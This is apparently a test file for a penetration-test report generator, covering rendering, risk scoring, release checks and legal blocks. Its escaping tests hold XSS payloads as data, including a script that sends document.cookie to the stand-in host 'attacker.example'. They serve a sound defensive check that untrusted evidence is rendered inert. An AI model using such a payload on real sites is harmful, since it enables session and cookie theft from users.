import { readFile, writeFile } from 'node:fs/promises';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';
import { buildSampleReportData } from './fixtures/sample-report-data.ts';
import { renderReportHtml, escapeHtml, unfilledPlaceholders } from './render.ts';
import { runChecklist } from './checklist.ts';
import { renderAttestationLetterHtml, renderDeletionConfirmationHtml } from './documents.ts';
import { LEGAL_BLOCKS, mandatoryBlocksFor } from './legal/blocks.ts';

/**
 * Golden-file test.
 *
 * A fixed fixture in, byte-stable HTML out. Run with `UPDATE_GOLDEN=1` to accept an intentional
 * change; a change that arrives without that is a change nobody meant to make, and in a document
 * that goes to clients that is worth catching.
 */
const goldenPath = fileURLToPath(new URL('./__golden__/sample-report.html', import.meta.url));

describe('renderReportHtml', () => {
  it('prints the OWASP risk rating beside CVSS, with the factors that produced it', async () => {
    const html = await renderReportHtml(buildSampleReportData());
    expect(html).toContain('OWASP risk rating');
    // The reader must be able to check the arithmetic: the derived rating and the answers behind it.
    expect(html).toContain('Scored against the OWASP Risk Rating Methodology');
    expect(html).toContain('Ease of exploit');
    // Likelihood 7.00 (high) against impact 5.50 (medium) is High on the published matrix.
    expect(html).toContain('OWASP High');
  });

  it('says nothing at all about a finding nobody has risk-rated', async () => {
    // An unanswered form must never render as a low risk. The section is absent instead.
    const data = buildSampleReportData();
    const html = await renderReportHtml({
      ...data,
      findings: data.findings.map((finding) => ({ ...finding, owaspRiskScores: undefined })),
    });
    expect(html).not.toContain('OWASP risk rating');
  });

  it('matches the golden file', async () => {
    const html = await renderReportHtml(buildSampleReportData());

    if (process.env.UPDATE_GOLDEN === '1') {
      await writeFile(goldenPath, html, 'utf8');
    }

    const golden = await readFile(goldenPath, 'utf8').catch(() => null);
    expect(golden, 'golden file missing; run with UPDATE_GOLDEN=1 to create it').not.toBeNull();
    expect(html).toBe(golden);
  });

  it('is deterministic across renders', async () => {
    const first = await renderReportHtml(buildSampleReportData());
    const second = await renderReportHtml(buildSampleReportData());
    expect(first).toBe(second);
  });

  it('contains every section the specification requires', async () => {
    const html = await renderReportHtml(buildSampleReportData());
    for (const anchor of [
      'id="contents"',
      'id="document-control"',
      'id="executive-summary"',
      'id="risk-overview"',
      'id="scope"',
      'id="methodology"',
      'id="coverage"',
      'id="attack-narrative"',
      'id="findings"',
      'id="positive-observations"',
      'id="recommendations"',
      'id="compliance"',
      'id="appendices"',
      'id="limitations"',
    ]) {
      expect(html, anchor).toContain(anchor);
    }
  });

  it('always carries the mandatory legal blocks', async () => {
    const html = await renderReportHtml(buildSampleReportData());
    expect(html).toContain('LIMITATIONS AND DISCLAIMER');
    expect(html).toContain('Confidentiality.');
    expect(html).toContain('Reliance and distribution.');
    expect(html).toContain('is not empanelled by CERT-In');
    expect(mandatoryBlocksFor('assessmentReport').length).toBeGreaterThanOrEqual(2);
  });

  it('states the CVSS vector, not only the score', async () => {
    const html = await renderReportHtml(buildSampleReportData());
    expect(html).toContain('CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N');
  });

  it('leaves no unfilled placeholder in the sample', () => {
    expect(unfilledPlaceholders(buildSampleReportData())).toEqual([]);
  });

  it('generates the coverage matrix from what ran, including the untested reasons', async () => {
    const html = await renderReportHtml(buildSampleReportData());
    expect(html).toContain('state-tested');
    expect(html).toContain('state-notTested');
    expect(html).toContain('No proxy or CDN sits in front of the staging environment');
  });
});

describe('escaping', () => {
  it('neutralises markup, because evidence is attacker-controlled by definition', () => {
    expect(escapeHtml('<img src=x onerror=alert(1)>')).toBe(
      '&lt;img src=x onerror=alert(1)&gt;',
    );
    expect(escapeHtml(`"' & <script>`)).toBe('&quot;&#39; &amp; &lt;script&gt;');
  });

  it('renders a stored XSS payload inert in the finished document', async () => {
    const data = buildSampleReportData();
    const first = data.findings[0];
    if (!first) throw new Error('fixture has no findings');
    first.evidence = [
      {
        kind: 'response',
        caption: 'Payload as captured',
        text: '<script>fetch("https://attacker.example/"+document.cookie)</script>',
      },
    ];
    first.title = '<img src=x onerror=alert(document.domain)>';

    const html = await renderReportHtml(data);
    expect(html).not.toContain('<script>fetch(');
    expect(html).not.toContain('<img src=x onerror');
    expect(html).toContain('&lt;script&gt;fetch(');
  });
});

describe('runChecklist', () => {
  it('blocks release until the human items are ticked', () => {
    const outcome = runChecklist(buildSampleReportData());
    expect(outcome.blocking, JSON.stringify(outcome.blocking)).toEqual([]);
    expect(outcome.awaitingHuman.length).toBeGreaterThan(0);
    expect(outcome.releasable).toBe(false);
  });

  it('becomes releasable once a person confirms the manual items', () => {
    const outcome = runChecklist(buildSampleReportData(), {
      'critical-notified': true,
      'evidence-masked': true,
      'read-every-line': true,
    });
    expect(outcome.releasable).toBe(true);
  });

  it('refuses a report with a finding that has no evidence', () => {
    const data = buildSampleReportData();
    data.findings[0]!.evidence = [];
    const outcome = runChecklist(data, {
      'critical-notified': true,
      'evidence-masked': true,
      'read-every-line': true,
    });
    expect(outcome.releasable).toBe(false);
    expect(outcome.blocking.map((item) => item.id)).toContain('findings-have-evidence');
  });

  it('refuses a report with a candidate finding still in it', () => {
    const data = buildSampleReportData();
    data.findings[1]!.status = 'candidate';
    const outcome = runChecklist(data);
    expect(outcome.blocking.map((item) => item.id)).toContain('no-candidates');
  });

  it('refuses a report containing a draft marker', () => {
    const data = buildSampleReportData();
    data.findings[2]!.remediation = 'TODO: write the real remediation before release';
    const outcome = runChecklist(data);
    expect(outcome.blocking.map((item) => item.id)).toContain('no-draft-markers');
  });

  it('refuses a report that reuses the sample client name for a real client', () => {
    const data = buildSampleReportData();
    data.clientLegalName = 'Actual Client Private Limited';
    const outcome = runChecklist(data);
    expect(outcome.blocking.map((item) => item.id)).toContain('client-name-correct');
  });

  it('refuses a report whose coverage matrix has an unexplained gap', () => {
    const data = buildSampleReportData();
    data.coverage = data.coverage.map((entry) =>
      entry.state === 'notTested' ? { ...entry, reason: undefined } : entry,
    );
    const outcome = runChecklist(data);
    expect(outcome.blocking.map((item) => item.id)).toContain('coverage-complete');
  });
});

describe('one-page documents', () => {
  const branding = buildSampleReportData().branding;

  it('the attestation letter carries no finding detail', async () => {
    const data = buildSampleReportData();
    const html = await renderAttestationLetterHtml({
      branding,
      clientLegalName: data.clientLegalName,
      engagementTitle: data.engagementTitle,
      reportReference: data.reportReference,
      reportVersion: data.reportVersion,
      reportDate: data.reportDate,
      statusDate: data.reportDate,
      testStartDate: data.testStartDate,
      testEndDate: data.testEndDate,
      testType: data.testType,
      cvssVersion: data.cvssVersion,
      methodology: data.methodology,
      scopeSummary: data.scopeIncluded,
      findings: data.findings,
      testerName: 'A. Tester',
      testerTitle: 'Principal consultant',
      registeredAddress: 'Registered address to be published on incorporation',
    });

    expect(html).toContain('LETTER OF ATTESTATION');
    expect(html).toContain('is not empanelled by CERT-In');
    expect(html).toContain('No duty of care is owed');
    // The whole point: it can be forwarded without forwarding the vulnerabilities.
    for (const finding of data.findings) {
      expect(html).not.toContain(finding.title);
      expect(html).not.toContain(finding.remediation.slice(0, 40));
    }
  });

  it('the deletion confirmation quantifies what was destroyed', async () => {
    const data = buildSampleReportData();
    const html = await renderDeletionConfirmationHtml({
      branding,
      clientLegalName: data.clientLegalName,
      engagementTitle: data.engagementTitle,
      reportReference: data.reportReference,
      testStartDate: data.testStartDate,
      testEndDate: data.testEndDate,
      retentionDays: 90,
      deletionDate: '18 October 2026',
      reportDate: '18 October 2026',
      testerName: 'A. Tester',
      testerTitle: 'Principal consultant',
      destroyed: { evidenceObjects: 412, credentialSets: 6 },
    });

    expect(html).toContain('CONFIRMATION OF DATA DELETION');
    expect(html).toContain('412');
    expect(html).toContain('cryptographically shredded');
    expect(html).toContain('rotated');
  });
});

describe('legal blocks', () => {
  it('every block declares where it appears and carries a version', () => {
    for (const block of LEGAL_BLOCKS) {
      expect(block.version, block.id).toMatch(/^\d+\.\d+\.\d+/);
      expect(block.appearsIn.length, block.id).toBeGreaterThan(0);
      expect(block.text.length, block.id).toBeGreaterThan(200);
    }
  });

  it('the mandatory report blocks cannot be removed from the set', () => {
    const mandatory = mandatoryBlocksFor('assessmentReport').map((block) => block.id);
    expect(mandatory).toContain('report-limitations-and-disclaimer');
    expect(mandatory).toContain('report-cover-classification');
  });
});
